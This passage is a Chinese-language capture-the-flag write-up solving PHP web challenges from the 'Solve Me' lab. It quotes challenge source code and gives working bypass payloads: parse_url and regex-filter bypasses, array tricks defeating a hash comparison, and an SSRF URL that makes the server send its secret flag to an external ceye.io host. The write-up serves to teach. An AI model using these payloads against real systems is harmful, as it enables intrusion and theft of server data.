(int)&apos;6e6&apos;;//6</span><br></pre></td></tr></table></figure><p>从上面代码可以看出，(int)将字符串转换成了int型，比如第三行，将123abc输出为123，第四行把1abc23输出为1。第五行把abc123输出为123</p><p>这里我们就可以知道(int)只取字符串中的数字，且只取第一个出现字母前的数字。</p><p>所以这里我们可以用科学计数法，6e6这个刚好满足代码的逻辑。</p><p>sleep也之执行6秒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http://wintersleep.solveme.peng.kr/?time=6e6</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    session_start();</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;username&apos;], $_GET[&apos;password&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(isset($_SESSION[&apos;hard_login_check&apos;]))&#123;</span><br><span class="line">            echo &apos;Already logged in..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;username&apos;]&#123;3&#125;) || strtolower($_GET[&apos;username&apos;]) != $hidden_username)&#123;</span><br><span class="line">            echo &apos;Wrong username..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;password&apos;]&#123;7&#125;) || $_GET[&apos;password&apos;] != $hidden_password)&#123;</span><br><span class="line">            echo &apos;Wrong password..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[&apos;hard_login_check&apos;] = true;</span><br><span class="line">            echo &apos;Login success!&apos;;</span><br><span class="line">            header(&apos;Location: ./&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>这里看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;username&apos;]&#123;3&#125;//取username提交参数的索引号为3的值</span><br><span class="line"></span><br><span class="line">$_GET[&apos;password&apos;]&#123;7&#125;//取username提交参数的索引号为7的值</span><br></pre></td></tr></table></figure><ul><li>strtolower() 函数把字符串转换为小写。</li></ul><p>满足上面代码给出的条件，最后是会跳转到根目录下。</p><p>那我们直接访问网站的根目录，显示是调转到/login.php的。</p><p>试试curl或者burpsuite试试。这里在windows下不自带curl命令的，我们可以用windows的git bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/</span><br></pre></td></tr></table></figure><p>这样就可以看到根目录下的源码，发现flag</p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&quot;/lib.php&quot;;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">    foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, &quot;=&quot;);</span><br><span class="line">        if($idx_equal === false)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = &quot;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $key = substr($param, 0, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($key, &quot;do_you_want_flag&quot;) !== false || strpos($value, &quot;yes&quot;) !== false)&#123;</span><br><span class="line">            die(&quot;no hack&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>代码函数理解</p><ul><li>urldecode — 解码已编码的 URL 字符串</li><li>parse_url — 解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</li><li>$_SERVER[‘REQUEST_URI’] - 获取域名后面的值，包括/</li><li>explode - 把字符串打散为数组。 explode(separator,string,limit) separator表示在哪里分割字符串，string要分割的字符串,limit可选，规定所返回的数组元素的数目。</li><li>strpos - 查找字符串在另一字符串中第一次出现的位置，对大小写敏感。</li><li>substr - 函数返回字符串的一部分。</li></ul><p>由代码的后半部分中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">    die($flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里要求我们提交do_you_want_flag=yes去获取flag，但是前半部分由会判断的。</p><p>前半段代码中的key值最后为do_you_want_flag,value值为yes。显然是不能过判断的。</p><p>这里用到一个函数的漏洞，那就是parse_url()函数。当我们在url中的目前多加一个<code>/</code>时，他会返回flase。</p><p>这样我们就可以绕过前面的判断。例如这题。我们提交payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure><p>另解：</p><blockquote><p>URL filtering那题，其实感觉上，<code>///</code>这种解法是非预期的。</p><p>根据官方给出的wp，其实可以回来看到题目里有一步多余的url_decode操作，官方wp给出的解法是通过注入%23，使上下获取到的查询字串不对称，从而拿到flag，从代码看来的话，官方wp与题目中的提示更契合。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr/?%23do_you_want_flag=yes</span><br></pre></td></tr></table></figure><h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;foo&apos;], $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(strlen($_GET[&apos;foo&apos;]) &gt; 30 || strlen($_GET[&apos;bar&apos;]) &gt; 30)&#123;</span><br><span class="line">            die(&apos;Too long&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;foo&apos;] === $_GET[&apos;bar&apos;])&#123;</span><br><span class="line">            die(&apos;Same value&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(hash(&apos;sha512&apos;, $_GET[&apos;foo&apos;]) !== hash(&apos;sha512&apos;, $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line">            die(&apos;Different hash&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>代码函数理解：</p><ul><li>strlen - 函数返回字符串的长度。</li><li>string hash ( string $algo , string $data [, bool $raw_output = false ] ) algo 要使用的哈希算法 data 要进行哈希运算的消息</li></ul><p>这里需要两个不同值的hash相等来通过判断，但是在PHP中可以用数组进行绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure><h2 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[&apos;value&apos;];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[&apos;username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&apos;username&apos;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</span><br><span class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>代码函数理解：</p><ul><li>unset — 释放给定的变量</li><li>chr - 函数从指定的 ASCII 值返回字符。</li></ul><p>看以上代码，可以看出这里的<code>$username</code>是通过<code>$value</code>拼接出来的，这里我们就需要用value拼接出<code>15th_HackingCamp</code></p><p>这里还规定了ASCII值不能在32-127这个范围内。</p><p>在PHP中，chr有以下特性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure><p>所以用以下脚本生成一个payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = &apos;15th_HackingCamp&apos;;</span><br><span class="line">$arr = str_split($username);</span><br><span class="line"></span><br><span class="line">foreach($arr as $value)&#123;</span><br><span class="line">$value = ord($value) + 256;</span><br><span class="line">$payload .= &apos;value[]=&apos; . $value . &apos;&amp;&apos;;</span><br><span class="line">&#125; </span><br><span class="line">echo $payload .= &apos;password=simple_passw0rd&apos;;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><h2 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^https?\:\/\/&apos;.$_SERVER[&apos;HTTP_HOST&apos;].&apos;/i&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed URL&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if($parse[&apos;path&apos;] !== &apos;/plz_give_me&apos;)&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[&apos;scheme&apos;].&apos;://&apos;.$parse[&apos;host&apos;].&apos;/&apos;.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>代码中用了三个preg_match函数进行过滤</p><ul><li>第一个过滤了下划线</li><li>第二个限制<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>,并且抓包不允许修改HOST</li><li>第三个parse_url解析后路径需为/plz_give_me</li></ul><p>显然第三个和第一个是矛盾的。但是在官方手册上，parse_url有一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line">要解析的 URL。无效字符将使用 _ 来替换。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$url = urldecode(&quot;https://uknowsec.cn/%11test%11&quot;);</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">array(3) &#123; [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot; [&quot;host&quot;]=&gt;  string(11) &quot;uknowsec.cn&quot; [&quot;path&quot;]=&gt;  string(7) &quot;/_test_&quot; &#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以绕过第三个和第一个过滤了。</p><p>但是我们提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%11give%11me</span><br></pre></td></tr></table></figure><p>没有回显是得不到flag的，如何解决Host的问题在官方手册中还有这样一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = &apos;http://username:password@hostname:9090/path?arg=value#anchor&apos;;</span><br></pre></td></tr></table></figure><p>所以Host的值我们可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givemealink.solveme.peng.kr@hostname</span><br></pre></td></tr></table></figure><p>我们可以用CEYE.IO来得到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@test.xxx.ceye.io/plz%1agive%1ame</span><br></pre></td></tr></table></figure><h2 id="Give-me-a-link-1"><a href="#Give-me-a-link-1" class="headerlink" title="Give me a link"></a>Give me a link</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if(!preg_match(&apos;/^https?$/i&apos;, $parse[&apos;scheme&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed scheme&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed host&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/\/plz_give_me$/&apos;, $parse[&apos;path&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        if($socket === false)&#123;</span><br><span class="line">            die(&apos;Failed to create socket&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[&apos;host&apos;]);</span><br><span class="line">        $port = is_null($parse[&apos;port&apos;]) ? 80 : $parse[&apos;port&apos;];</span><br><span class="line"></span><br><span class="line">        if(socket_connect($socket, $host, $port) === false)&#123;</span><br><span class="line">            die(&apos;Failed to connect&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = &quot;HEAD /&quot;.$flag.&quot; HTTP/1.1\r\n&quot;.</span><br><span class="line">            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</span><br><span class="line">            &quot;Connection: Close\r\n&quot;.</span><br><span class="line">            &quot;\r\n\r\n&quot;;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, 1024);var_dump($recv);</span><br><span class="line">        if(!preg_match(&apos;/^HTTP\/1.1 200 OK\r\n/&apos;, $recv))&#123;</span><br><span class="line">            die(&apos;Not allowed response&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>这个题目和前面一个题目类似，但是这里对host有了新的要求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">    die(&apos;Not allowed host&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>正则要求以localhost和127开头，可以用ip2long来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">因为PHP的 integer 类型是有符号，并且有许多的IP地址讲导致在32位系统的情况下为负数， 你需要使用 &quot;%u&quot; 进行转换通过 sprintf() 或 printf() 得到的字符串来表示无符号的IP地址。</span><br></pre></td></tr></table></figure><p>在手册中有如上Note，这里如果直接代入负数是不能正常访问的，所以我们要把他转换为无符号的ip地址。</p><p>构造脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip =&apos;182.254.0.0&apos;;</span><br><span class="line">echo ip2long($ip),&apos;&lt;br&gt;&apos;;//-1224867840</span><br><span class="line">printf(&quot;%u\n&quot;, ip2long($ip));//3070099456</span><br></pre></td></tr></table></figure><p>这里我们代入3070099456发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink2.solveme.peng.kr/?url=http://3070099456/plz%01give%01me</span><br></pre></td></tr></table></figure></p><p>这里就可以在web服务器日志中查看flag。</p><h2 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;say&apos;]) &amp;&amp; strlen($_GET[&apos;say&apos;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(&apos;/^(.*)flag(.*)$/&apos;, &apos;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&apos;, $_GET[&apos;say&apos;]);</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/give_me_the_flag/&apos;, $say))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;What the f**k?&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(.*)flag(.*)$/</span><br></pre></td></tr></table></figure><p>以上正则是存在一个缺陷的，<code>^ $</code>界定了必须在同一行，否则匹配不到,所以我们可以用换行符进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://replacefilter.solveme.peng.kr?say=%0agive_me_the_flag</span><br></pre></td></tr></table></figure><h2 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h2><p>打开题目，查看源码发现是jsfuck。</p><p>一般这种题目是可以直接控制台运行的。但是这里是不行的，</p><p>先了解下jsfuck的编码格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">alert(1) =&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</span><br></pre></td></tr></table></figure><p>从这里我们可以看出我们可以根据括号匹配提取出<code>alert(1)</code>的jsfuck代码，而这串代码放到控制台是可以直接运行看到加密之前的结果的。</p><p>如下图：</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/jsfuck.png" alt=""></p><p>用同样的方法，我们去提取这一串jsfuck代码。这里可以用sublime text来进行括号的匹配</p><p><code>ctrl+shift+空格</code> 快捷键匹配</p><p>经过几次匹配就能得到jsfuck代码</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/jsfuck1.png" alt=""></p><h2 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;Anti SQLi&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $pw = 